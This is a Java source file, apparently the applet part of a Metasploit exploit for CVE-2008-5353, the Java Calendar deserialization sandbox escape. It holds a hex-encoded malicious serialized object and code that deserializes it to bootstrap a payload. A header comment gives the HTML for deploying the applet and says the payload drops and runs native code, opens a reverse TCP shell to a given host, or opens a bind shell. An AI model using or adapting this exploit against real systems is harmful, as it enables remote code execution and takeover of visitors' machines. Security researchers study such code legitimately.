/*
 * 28 May 2009 - v3
 * 
 * Based off Landon Fuller's PoC and write up here:
 *     http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html
 * 
 * An interesting discussion by Julien Tinnes can be found here:
 *     http://blog.cr0.org/2009/05/write-once-own-everyone.html
 * 
 * This issue has been resolved by Sun, details can be found here:
 *     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5353
 *     http://sunsolve.sun.com/search/document.do?assetkey=1-26-244991-1
 * 
 * To test, grab and install an old vulnerable copy of the JRE/JDK here:
 *     http://java.sun.com/products/archive/
 * 
 * Once compiled into an applet (Applet.jar) it can be loaded with the following html:
 *     <html>
 *       <head></head>
 *       <body>
 *         <applet archive="Applet.jar" code="msf.x.AppletX.class" width="1" height="1">
 *           <param name="data" value="41414141424242424343434355555555"/>
 *           <param name="lhost" value="192.168.2.2"/>
 *           <param name="lport" value="4444"/>
 *         </applet>
 *       </body>
 *     </html>
 *     
 *     If the data param is set, PayloadX will drop this native payload data to file and execute it.
 *     If no data param is set (or it is empty):
 *         If an lhost is set, PayloadX will perform a reverse TCP shell to lhost:4444
 *         If lhost and lport are set, PayloadX will perform a reverse TCP shell to lhost:lport
 *         If no lhost is set, PayloadX will perform a bind shell on TCP port lport
 *         If no params are set, PayloadX will perform a bind shell on TCP port 4444
 */

package msf.x;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class AppletX extends Applet
{
	private static final long serialVersionUID = -3238297386635759160L;

	// a slightly modified version of Fuller's serialized Calendar object in hex form...
	private static final String serializedObject = "ACED00057372001B6A6176612E7574696C2E477265676F7269616E43616C656E6461728F3DD7D6E5B0D0C10200014A0010677265676F7269616E4375746F766572787200126A6176612E7574696C2E43616C656E646172E6EA4D1EC8DC5B8E03000B5A000C6172654669656C647353657449000E66697273744461794F665765656B5A0009697354696D655365745A00076C656E69656E744900166D696E696D616C44617973496E46697273745765656B4900096E6578745374616D7049001573657269616C56657273696F6E4F6E53747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F54696D655A6F6E653B78700100000001010100000001000000020000000100000121563AFC0E757200025B494DBA602676EAB2A502000078700000001100000001000007D9000000040000001500000004000000120000008A00000002000000030000000100000004000000100000001100000022000002DEFE488C0000000000757200025B5A578F203914B85DE20200007870000000110101010101010101010101010101010101737200186A6176612E7574696C2E53696D706C6554696D655A6F6E65FA675D60D15EF5A603001249000A647374536176696E6773490006656E6444617949000C656E644461794F665765656B490007656E644D6F6465490008656E644D6F6E7468490007656E6454696D6549000B656E6454696D654D6F64654900097261774F666673657449001573657269616C56657273696F6E4F6E53747265616D490008737461727444617949000E73746172744461794F665765656B49000973746172744D6F646549000A73746172744D6F6E7468490009737461727454696D6549000D737461727454696D654D6F64654900097374617274596561725A000B7573654461796C696768745B000B6D6F6E74684C656E6774687400025B42787200126A6176612E7574696C2E54696D655A6F6E6531B3E9F57744ACA10200014C000249447400124C6A6176612F6C616E672F537472696E673B787074000E416D65726963612F446177736F6E0036EE80000000000000000000000000000000000000000000000000FE488C00000000020000000000000000000000000000000000000000000000000000000000757200025B42ACF317F8060854E002000078700000000C1F1C1F1E1F1E1F1F1E1F1E1F770A000000060000000000007571007E0006000000020000000000000000787372000D6D73662E782E4C6F61646572585E8B4C67DDC409D8020000787078FFFFF4E2F964AC000A";
		
	public static String data = null;
	
	public void init()
	{
		try
		{	
	        ObjectInputStream oin = new ObjectInputStream( new ByteArrayInputStream( PayloadX.StringToBytes( serializedObject ) ) );
			
	        Object deserializedObject = oin.readObject();
   
			if( deserializedObject != null && LoaderX.instance != null )
			{
				String data  = getParameter( "data" );
				String jar   = getParameter( "jar" );
				String lhost = getParameter( "lhost" );
				String lport = getParameter( "lport" );

				if( data == null )
					data = "";
				
				LoaderX.instance.bootstrapPayload( data, jar, lhost, ( lport == null ? 4444 : Integer.parseInt( lport ) ) );
			}
		}
		catch( Exception e ) {}
	}

}
